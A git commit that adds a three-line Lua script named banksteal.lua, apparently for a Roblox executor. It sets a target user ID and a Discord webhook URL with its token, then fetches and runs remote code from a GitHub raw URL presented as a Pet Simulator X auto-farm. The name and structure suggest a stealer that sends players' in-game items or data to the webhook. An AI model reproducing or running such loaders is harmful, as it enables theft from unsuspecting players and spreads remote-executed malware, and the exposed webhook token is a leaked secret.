5669f23f059a5abc24295d3bf65f2c9e6dbe1a9a
SanctionedShinobi <98543352+SanctionedShinobi@users.noreply.github.com>
2023-01-23 17:13:33 -0500

    Add files via upload

---
+++ banksteal.lua
@@ -0,0 +1,3 @@
+_G.UserID = 3552352482
+_G.WebHook = "https://discord.com/api/webhooks/1067185506821091328/nD3KSJ7r1GMpvxi79U_9m4du_5jfK98sST9l-8M4uEQX0l5wjDwOHyHGaCHA3mrveial"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
